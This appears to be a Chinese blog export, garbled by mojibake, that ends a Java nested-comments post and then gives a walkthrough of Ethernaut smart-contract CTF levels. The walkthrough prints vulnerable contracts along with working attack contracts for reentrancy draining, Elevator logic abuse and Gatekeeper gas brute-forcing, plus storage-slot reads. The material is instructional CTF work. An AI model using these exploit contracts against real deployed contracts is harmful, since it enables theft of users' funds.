<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">getTopCommentsByBlogId</span><span class="params">(Long blogId)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (blogId == <span class="keyword">null</span> || blogId &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    List&lt;Comment&gt; rawCmts = commentMapper.findTopCommentsByParentIdAndBlogId((<span class="keyword">long</span>) -<span class="number">1</span>, blogId);</span><br><span class="line">    <span class="keyword">return</span> getParent(rawCmts);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Comment&gt; <span class="title">getParent</span><span class="params">(List&lt;Comment&gt; rawComments)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯¹äºæ¯ä¸€ä¸ªé¡¶çº§å›å¤</span></span><br><span class="line">    <span class="keyword">for</span> (Comment topComment : rawComments) &#123;</span><br><span class="line">        <span class="comment">// å°†é¡¶çº§è¯„è®ºçš„å­å­™è¯„è®ºå½’ç»“åˆ°ä¸€ä¸ªé›†åˆä¸­</span></span><br><span class="line">        LinkedList&lt;Comment&gt; comments = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">        List&lt;Comment&gt; replyCmtsByTopCmt = topComment.getReplyComments();</span><br><span class="line">        <span class="keyword">for</span> (Comment replyComment : replyCmtsByTopCmt) &#123;</span><br><span class="line">            handleChild(replyComment, comments);</span><br><span class="line"><span class="comment">//                replyComment.setReplyNickname(topComment.getId().toString());</span></span><br><span class="line">            replyComment.setReplyNickname(topComment.getNickname());</span><br><span class="line">        &#125;</span><br><span class="line">        topComment.setReplyComments(comments);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> rawComments;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¤„ç†äºŒçº§è¯„è®ºä»¥åŠå­è¯„è®º</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">handleChild</span><span class="params">(Comment replyComment, List&lt;Comment&gt; parent)</span> </span>&#123;</span><br><span class="line">    List&lt;Comment&gt; grandchildren = replyComment.getReplyComments();</span><br><span class="line">    replyComment.setReplyComments(<span class="keyword">null</span>);</span><br><span class="line">    parent.add(replyComment);</span><br><span class="line">    <span class="keyword">for</span> (Comment grandChild : grandchildren) &#123;</span><br><span class="line"><span class="comment">//            grandChild.setReplyNickname(replyComment.getId().toString());</span></span><br><span class="line">        grandChild.setReplyNickname(replyComment.getNickname());</span><br><span class="line">        <span class="keyword">if</span> (grandChild.getReplyComments() != <span class="keyword">null</span>) handleChild(grandChild, parent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥è¯¢ç»“æœï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">	&#123;</span><br><span class="line">        id: 1,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: [</span><br><span class="line">            &#123;</span><br><span class="line">                id: 2,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 1,</span><br><span class="line">                replyComments:[]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                id: 3,</span><br><span class="line">                content: 'hello',</span><br><span class="line">                parent_comment_id: 2,</span><br><span class="line">                replyComments:[]</span><br><span class="line">			&#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        id: 4,</span><br><span class="line">        content: 'hello',</span><br><span class="line">        parent_comment_id: -1,</span><br><span class="line">        replyComments: []</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>è¯¥æ–¹å¼ç»“åˆäº†ä¸€çº§è¯„è®ºå’Œå¤šçº§è¯„è®ºçš„ä¼˜ç‚¹ï¼Œæ·±å¾—å¹¿å¤§å¼€å‘è€…çš„çƒ­çˆ±ã€‚</p>
<p><img src="https://qiniu.yalexin.top/%E4%BA%8C%E7%BA%A7%E8%AF%84%E8%AE%BA.png" alt></p>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
      <tags>
        <tag>MySql</tag>
        <tag>java</tag>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>ã€Ethernauté—¯å…³å½•ã€‘ä¸­ç¯‡</title>
    <url>/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/</url>
    <content><![CDATA[<p>åŸæ–‡å†ç»­ï¼Œä¹¦æ¥ä¸Šå›ï¼Œæœ¬æ–‡ç»§ç»­é—¯å…³ï¼Œæœ¬æ¬¡æˆ‘ä»¬æ¥å­¦ä¹ é‡å…¥æ¼æ´ã€Solidityå­˜å‚¨å¸ƒå±€ã€ERC20ä»£å¸æ ‡å‡†ã€delegatecallã€äº¤æ˜“è¿½è¸ªå’Œå­—èŠ‚ç ç­‰çŸ¥è¯†ã€‚<a id="more"></a></p>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šå…³æ¡ä»¶ï¼šå°†åˆçº¦ä»£å¸éƒ½å·èµ°ã€‚</p>
<p>è€ƒå¯Ÿçš„æ˜¯é‡å…¥æ¼æ´ï¼Œè¯¥æ¼æ´ææ€•æ˜¯æ™ºèƒ½åˆçº¦ä¸Šé¢æœ€è‡­åæ˜­è‘—çš„æ¼æ´äº†ï¼Œ<code>withdraw</code>å‡½æ•°ä¸­ï¼Œå…ˆè¿›è¡Œè½¬è´¦(ä»¥<code>call</code>çš„æ–¹å¼)ï¼Œç„¶åæ‰æ›´æ–°ä½™é¢ï¼Œé‚£ä¹ˆå¦‚æœè½¬è´¦ç›®çš„æ–¹æ˜¯ä¸€ä¸ªåˆçº¦è´¦æˆ·ï¼Œåœ¨è½¬è´¦è¿‡ç¨‹åˆä¼šç»§ç»­è°ƒç”¨<code>withdraw</code>å‡½æ•°ï¼Œåˆ™æ­¤æ—¶<code>balances[msg.sender]</code>æ¥ä¸åŠæ›´æ–°ï¼Œåˆ™ä¼šé€ æˆåˆçº¦çš„ä»£å¸è¢«ç›—å–ã€‚è‘—åçš„DAOæ”»å‡»å°±æ˜¯åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚</p>
<p>å…·ä½“è€Œè¨€ï¼Œå‚ç…§ä¸‹é¢çš„åˆçº¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Target&#123;</span><br><span class="line">     function donate(address _to) external payable ;</span><br><span class="line">     function withdraw(uint _amount) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyAttack &#123;</span><br><span class="line">	address public instance ;</span><br><span class="line">  	constructor(address _instance) payable &#123;</span><br><span class="line">        instance &#x3D; _instance;  </span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; é€šè¿‡æŸ¥çœ‹å¯çŸ¥ï¼ŒReentrance åˆçº¦ä¸­æœ‰ 0.001 ether</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function donate()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.donate&#123;value: 0.001 ether&#125;(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»æµç¨‹ï¼šæˆ‘ä»¬éƒ¨ç½²æˆ‘ä»¬çš„æ”»å‡»åˆçº¦ï¼ˆéƒ¨ç½²çš„æ—¶å€™ä¼ å…¥<code>Reentrance</code>åˆçº¦åœ°å€ï¼‰ï¼ŒåŒæ—¶å¾€æ”»å‡»åˆçº¦<code>ReEntrancyAttack</code>ä¸­è½¬å…¥0.001 etherï¼Œæ¥ç€è°ƒç”¨<code>donate</code>ï¼Œç„¶ååœ¨æ§åˆ¶å°è¾“å…¥<code>fromWei(await contract.balanceOf(&#39;0x11Ef368C1D3226dce5c53A9880b0DF148Ea3D0a1&#39;))</code>å³å¯å‘ç°æˆ‘ä»¬å·²ç»æ”¾å…¥<code>0.001 ether</code>,æ­¤æ—¶å¯ä»¥è°ƒç”¨æˆ‘ä»¬çš„<code>attack</code>å‡½æ•°ï¼Œè°ƒç”¨å®Œæ¯•ï¼Œæˆ‘ä»¬çš„æ”»å‡»åˆçº¦å°†ä¼šå¾—åˆ°<code>0.002 ether</code>ï¼Œå³æˆ‘ä»¬ä¸ä»…æ‹¿å›äº†åŸæœ¬æ”¾è¿›åˆçº¦<code>Reentrance</code>ä¸­çš„<code>0.001 ether</code>ï¼Œè¿˜é¡ºå¸¦æŠŠ<code>Reentrance</code>æœ¬èº«æœ‰çš„<code>0.001 ether</code>æ‹¿äº†è¿‡æ¥ã€‚</p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">&#x2F;&#x2F; åˆ¤æ–­æ˜¯ä¸æ˜¯æœ€åä¸€å±‚</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line">    &#x2F;&#x2F; å¦‚æœæŒ‡å®šå±‚_floorä¸æ˜¯æœ€åä¸€å±‚ï¼Œåˆ™ç§»åŠ¨åˆ°è¯¥æŒ‡å®šå±‚ï¼Œå¹¶ç»§ç»­åˆ¤æ–­</span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é€šå…³æ¡ä»¶ï¼šå°†<code>top</code>ç½®ä¸º<code>ture</code>ã€‚</p>
<p>æœ¬é¢˜ç›®å’Œ<code>solidity</code>ç‰¹æ€§å¥½åƒå…³è”ä¸æ˜¯å¾ˆå¤§ï¼Œè€ƒå¯Ÿçš„æ˜¯é€»è¾‘æ¼æ´ï¼Œæˆ‘ä»¬æƒ³è¦<code>top</code>ä¸ºçœŸï¼Œåˆ™<code>if</code>è¯­å¥çš„<code>building.isLastFloor(_floor)</code>å¿…é¡»è¿”å›<code>false</code>ï¼Œä½†æ˜¯ä¸‹é¢çš„19è¡Œå¤„<code>building.isLastFloor(floor)</code>åˆè¦æ±‚è¿”å›<code>true</code>ï¼Œå¯¹ç›¸åŒå€¼è¿”å›ä¸åŒçš„ç»“æœï¼Œçœ‹ä¸Šå»è²Œä¼¼çŸ›ç›¾ï¼Œå…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·å­æƒ³æƒ³ï¼Œåªè¦ç¬¬ä¸€æ¬¡è°ƒç”¨<code>isLastFloor</code>è¿”å›æ˜¯<code>false</code>,åé¢è°ƒç”¨å†è¿”å›<code>true</code>ä¸å°±è¡Œäº†å—ï¼Ÿå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract ElevatorAttack&#123;</span><br><span class="line">    uint public state;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">    	state &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">    &#x2F;&#x2F; ç¬¬ä¸€æ¬¡è°ƒç”¨</span><br><span class="line">		if (state &#x3D;&#x3D; 0)&#123;</span><br><span class="line">			state &#x3D; state + 1;</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else&#123;</span><br><span class="line">		&#x2F;&#x2F; ç¬¬äºŒæ¬¡åŠä»¥å</span><br><span class="line">			return true;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;</span><br><span class="line">      .,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,</span><br><span class="line">      *.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^         ,---&#x2F;V\</span><br><span class="line">      &#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.    ~|__(o.o)</span><br><span class="line">      ^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;  UU  UU</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šå°†<code>locked</code>æ”¹ä¸º<code>false</code></p>
<p>è·Ÿ<code>Vault</code>å…³å¡å¾ˆåƒï¼Œå¯ä»¥è¯´æ˜¯å®ƒçš„å‡çº§ç‰ˆï¼Œåœ¨è¿™é‡Œå°±å¾—å¥½å¥½è¯´ä¸€ä¸‹solidityä¸­çš„çŠ¶æ€å˜é‡å­˜å‚¨æ–¹å¼äº†ï¼Œå‚è€ƒ<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">ã€å®˜æ–¹æ–‡æ¡£ã€‘</a>ï¼Œæˆ‘ä»¬å¯çŸ¥ï¼š</p>
<blockquote>
<p>å­˜å‚¨å¤§å°å°‘äº 32 å­—èŠ‚çš„å¤šä¸ªå˜é‡ä¼šè¢«æ‰“åŒ…åˆ°ä¸€ä¸ª å­˜å‚¨æ’æ§½storage slot ä¸­ï¼Œè§„åˆ™å¦‚ä¸‹ï¼š</p>
<ul>
<li>å­˜å‚¨æ’æ§½storage slot çš„ç¬¬ä¸€é¡¹ä¼šä»¥ä½ä½å¯¹é½çš„æ–¹å¼å‚¨å­˜ã€‚</li>
<li>å€¼ç±»å‹ä»…ä½¿ç”¨å­˜å‚¨å®ƒä»¬æ‰€éœ€çš„å­—èŠ‚ã€‚</li>
<li>å¦‚æœ å­˜å‚¨æ’æ§½storage slot ä¸­çš„å‰©ä½™ç©ºé—´ä¸è¶³ä»¥å‚¨å­˜ä¸€ä¸ªå€¼ç±»å‹ï¼Œé‚£ä¹ˆå®ƒä¼šè¢«å­˜å…¥ä¸‹ä¸€ä¸ª å­˜å‚¨æ’æ§½storage slot ã€‚</li>
<li>ç»“æ„ä½“ï¼ˆstructï¼‰å’Œæ•°ç»„æ•°æ®æ€»æ˜¯ä¼šå¼€å¯ä¸€ä¸ªæ–°æ’æ§½ï¼ˆä½†ç»“æ„ä½“æˆ–æ•°ç»„ä¸­çš„å„å…ƒç´ ï¼Œåˆ™æŒ‰è§„åˆ™ç´§å¯†æ‰“åŒ…ï¼‰ã€‚</li>
<li>ç»“æ„ä½“å’Œæ•°ç»„ä¹‹åçš„æ•°æ®ä¹Ÿæˆ–å¼€å¯ä¸€ä¸ªæ–°æ’æ§½ã€‚</li>
</ul>
</blockquote>
<p>ç”±äº æ˜ å°„mapping å’ŒåŠ¨æ€æ•°ç»„ä¸å¯é¢„çŸ¥å¤§å°ï¼Œä¸èƒ½åœ¨çŠ¶æ€å˜é‡ä¹‹é—´å­˜å‚¨ä»–ä»¬ã€‚ç›¸åï¼Œä»–ä»¬è‡ªèº«æ ¹æ® <a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html#storage-inplace-encoding" target="_blank" rel="noopener">ä»¥ä¸Šè§„åˆ™</a> ä»…å ç”¨ 32 ä¸ªå­—èŠ‚ï¼Œç„¶åä»–ä»¬åŒ…å«çš„å…ƒç´ çš„å­˜å‚¨çš„å…¶å®ä½ç½®ï¼Œåˆ™æ˜¯é€šè¿‡ Keccak-256 å“ˆå¸Œè®¡ç®—æ¥ç¡®å®šï¼Œæ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥åœ¨<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">ã€æ–‡æ¡£ã€‘</a>ä¸­æŸ¥çœ‹ï¼Œè¿™é‡Œä¸æ¶‰åŠï¼Œå°±ä¸å¸¦å¤§å®¶çœ‹äº†ã€‚</p>
<p>å› æ­¤æ ¹æ®å˜é‡ç±»å‹å’Œå¯¹åº”å ç”¨å­—èŠ‚æ•°ï¼Œ<code>Privacy</code>ä¸­çš„å­˜å‚¨åˆ†å¸ƒå¤§è‡´å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----------------------------------------------------------------</span><br><span class="line">|              unused (30)                         | locked (1)| &lt;- slot 0</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                          ID (32)                             | &lt;- slot 1</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|   unused(28)   | awkwardness(2)|denomination(1)|flattening(1)| &lt;- slot 2</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[0] (32)                         | &lt;- slot 3</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[1] (32)                         | &lt;- slot 4</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[2] (32)                         | &lt;- slot 5</span><br><span class="line">----------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>å› æ­¤æˆ‘ä»¬ä½¿ç”¨</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"5"</span>)</span><br><span class="line">&gt; <span class="string">'0xa264a1b3d12c27658b731ce1c5c631521539801e9e246f3c0e3e03dd408a8de8'</span></span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥è·å–<code>data[2]</code>äº†ï¼Œä½†æ˜¯<code>bytes16(data[2])</code>ä¼šæˆªå–å…¶ä½ä½çš„å€¼ï¼Œåˆå› ä¸ºå¯¹å…¶æ–¹å¼ï¼Œå› æ­¤<code>a264a1b3d12c27658b731ce1c5c63152</code>æ‰æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æœã€‚</p>
<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šæ­£å¸¸æ‰§è¡Œå®Œ<code>enter</code>å‡½æ•°ã€‚</p>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ï¼Œå¦‚ä½•ç»•è¿‡ä¸‰ä¸ª<code>gate</code>å‡½æ•°ï¼Œç¬¬ä¸€ä¸ªå¯ä»¥å‚ç…§<code>Telephone</code>å…³å¡ï¼Œå€ŸåŠ©ç¬¬ä¸‰æ–¹åˆçº¦å³å¯ã€‚</p>
<p>å¯¹äºç¬¬äºŒä¸ªå‡½æ•°ï¼Œ<code>gasleft()</code>è¿”å›çš„æ˜¯å½“å‰å¯ç”¨çš„<code>gas</code>ï¼Œè¿™ä¸ªè¦ä½ çŸ¥é“è¯¥åˆçº¦è¿è¡Œåˆ°è¿™ä¸€è¡Œæ—¶å€™ï¼Œæ‰€æ¶ˆè€—çš„<code>gas</code>ï¼Œéœ€è¦æˆ‘ä»¬ç›´åˆ°é¢˜ç›®ä½¿ç”¨çš„ç¼–è¯‘å™¨ï¼Œç„¶åæ”¾åˆ°æœ¬åœ°è°ƒè¯•ï¼Œè¿™ç§æ–¹æ³•å¤ªéº»çƒ¦äº†ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æšä¸¾ï¼Œå³è°ƒç”¨æ—¶å€™è®¾ç½®gasä¸º<code>n*8191+x</code>ï¼Œä¸æ–­æ”¹å˜xï¼Œå†è°ƒç”¨å³å¯ã€‚</p>
<p>å¯¹äºç¬¬ä¸‰ä¸ªå‡½æ•°ï¼Œå‡è®¾<code>_gatekey</code>å¯ä»¥è¢«ä¸‹é¢æ•°å­—è¡¨ç¤ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xab cd ef gh ij kl mn op</span><br></pre></td></tr></table></figure>

<p>å¯¹äºç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œè¦æ±‚<code>ijklmnop==0000mnop</code>,å³<code>ijkl=0000</code>ï¼Œ</p>
<p>å¯¹äºç¬¬äºŒä¸ªæ¡ä»¶ï¼Œè¦æ±‚<code>00000000ijklmnop!=abcdefghijklmnop</code>ï¼Œå³<code>00000000!=abcdefgh</code></p>
<p>ç¬¬ä¸‰ä¸ªæ¡ä»¶ï¼Œè¦æ±‚<code>ijklmnop==0000xxxx</code>ï¼Œå…¶ä¸­ï¼Œ<code>xxxx</code>æ˜¯<code>tx.origin</code>çš„ä½ä¸¤ä¸ªå­—èŠ‚ã€‚</p>
<p>æ•…ï¼Œæ»¡è¶³æ¡ä»¶çš„ä¸€ä¸ª<code>_gateKey</code>ä¸º<code>1111111100001df4</code>ï¼ˆæˆ‘çš„metamaskè´¦æˆ·çš„æœ€ä½ä¸¤å­—èŠ‚æ˜¯<code>1df4</code>ï¼‰</p>
<p>ç»¼ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©ä¸‹é¢çš„æ”»å‡»åˆçº¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 	è¯¥åœ°å€å¯ä»¥åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ &#96;instance&#96; è·å–</span><br><span class="line">        address _addr &#x3D; 0x8F29B1467240Ccd340BD33371559cC76729b8e27;</span><br><span class="line">        bytes8 _gateKey &#x3D; 0x1111111100001df4;</span><br><span class="line">        for(uint x &#x3D; 0; x &lt; 8191; x +&#x3D; 1)&#123;</span><br><span class="line">            (bool success, bytes memory data) &#x3D; _addr.call&#123;gas: 81910 + x&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">            if(success)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šæ­£å¸¸æ‰§è¡Œå®Œ<code>enter</code>å‡½æ•°ã€‚</p>
<p>å…³äºç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œå‚ç…§å…³å¡ã€Gatekeeper Oneã€‘å³å¯ã€‚</p>
